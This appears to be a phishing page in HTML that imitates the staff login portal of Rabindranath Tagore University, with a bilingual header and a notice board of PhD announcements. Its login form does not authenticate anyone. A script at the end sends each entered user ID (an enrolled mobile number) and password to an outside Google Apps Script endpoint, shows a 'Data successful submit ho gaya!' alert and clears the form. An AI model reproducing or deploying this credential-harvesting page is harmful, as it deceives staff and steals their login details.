<!DOCTYPE html>
<html lang="as">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rabindranath Tagore University - Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Times New Roman', Times, serif;
        }

        body {
            background-color: #fcfcfc;
        }

        /* Header Styling */
        .header {
            background: linear-gradient(to bottom, #f3e7e9, #e3eeef);
            padding: 15px 30px;
            display: flex;
            align-items: center;
            border-bottom: 2px solid #ffeb3b;
        }

        .logo {
            width: 70px;
            height: 70px;
            margin-right: 20px;
            object-fit: contain;
        }

        .university-title {
            color: #4a154b;
        }

        .university-title h1 {
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 1px;
        }

        .university-title h2 {
            font-size: 20px;
            font-weight: normal;
        }

        /* Main Container */
        .container {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            gap: 40px;
            margin-top: 50px;
            padding: 0 20px;
        }

        /* Login Card */
        .login-card {
            background-color: #fafafa;
            width: 450px;
            padding: 30px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            border-radius: 4px;
            border: 1px solid #e0e0e0;
        }

        .login-title {
            color: #2e7d32;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 16px;
            margin-bottom: 8px;
            color: #333;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            font-size: 14px;
            border-radius: 2px;
        }

        .login-btn {
            display: block;
            margin: 25px auto 0 auto;
            background-color: #000;
            color: #fff;
            border: none;
            padding: 8px 25px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
        }

        /* Notice Board Card */
        .notice-card {
            background-color: #fff;
            width: 380px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
            border: 1px solid #ccc;
        }

        .notice-title {
            font-size: 22px;
            font-weight: bold;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 15px;
        }

        .notice-item {
            border-bottom: 1px solid #eee;
            padding: 12px 0;
        }

        .notice-meta {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 6px;
        }

        .date-badge {
            background-color: #616161;
            color: #fff;
            font-size: 11px;
            padding: 3px 6px;
            font-weight: bold;
            border-radius: 2px;
        }

        .view-btn {
            background-color: #03a9f4;
            color: #fff;
            font-size: 11px;
            padding: 3px 8px;
            text-decoration: none;
            font-weight: bold;
            border-radius: 2px;
        }

        .notice-link {
            color: #00796b;
            text-decoration: none;
            font-size: 14px;
            display: block;
            line-height: 1.4;
        }

        .notice-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- Header Section -->
    <header class="header">
        <img src="file:///D:/pdf-word/RTV%20logo.png" alt="RTV Logo" class="logo">
        <div class="university-title">
            <h1>RABINDRANATH TAGORE UNIVERSITY</h1>
            <h2>ৰবীন্দ্ৰনাথ ঠাকুৰ বিশ্ববিদ্যালয়</h2>
        </div>
    </header>

    <!-- Main Content Area -->
    <div class="container">
        
        <!-- Login Box -->
        <div class="login-card">
            <div class="login-title">STAFF LOGIN</div>
            <form id="loginForm">
                <div class="form-group">
                    <label for="userid">User Id</label>
                    <input type="text" id="userid" name="userid" placeholder="Enroled Mobile Number" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">LogIn</button>
            </form>
        </div>

        <!-- Notice Section -->
        <div class="notice-card">
            <div class="notice-title">জাননী(NOTICE)</div>
            
            <div class="notice-item">
                <div class="notice-meta">
                    <span class="date-badge">July 05, 2025</span>
                    <a href="#" class="view-btn">VIEW</a>
                </div>
                <a href="#" class="notice-link">Notification of Ph.D Entrance Examination, 2025</a>
            </div>

            <div class="notice-item">
                <div class="notice-meta">
                    <span class="date-badge">December 19, 2024</span>
                    <a href="#" class="view-btn">VIEW</a>
                </div>
                <a href="#" class="notice-link">Ph.D. course work ( Session 2024-25)</a>
            </div>

            <div class="notice-item">
                <div class="notice-meta">
                    <span class="date-badge">December 12, 2024</span>
                    <a href="#" class="view-btn">VIEW</a>
                </div>
                <a href="#" class="notice-link">Notice for PhD Six Monthly Progress Report (Session: 2023–</a>
            </div>

        </div>

    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxaj4pWphw6wCUVFF7vmwuVGqeQ4SENyBNamutM6mdhbk1gLUs12K38NOcEeX92sofzJg/exec';
        const form = document.getElementById('loginForm');

        form.addEventListener('submit', e => {
            e.preventDefault();
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => {
                    alert('Data successful submit ho gaya!');
                    form.reset();
                })
                .catch(error => console.error('Error!', error.message));
        });
    </script>

</body>
</html>
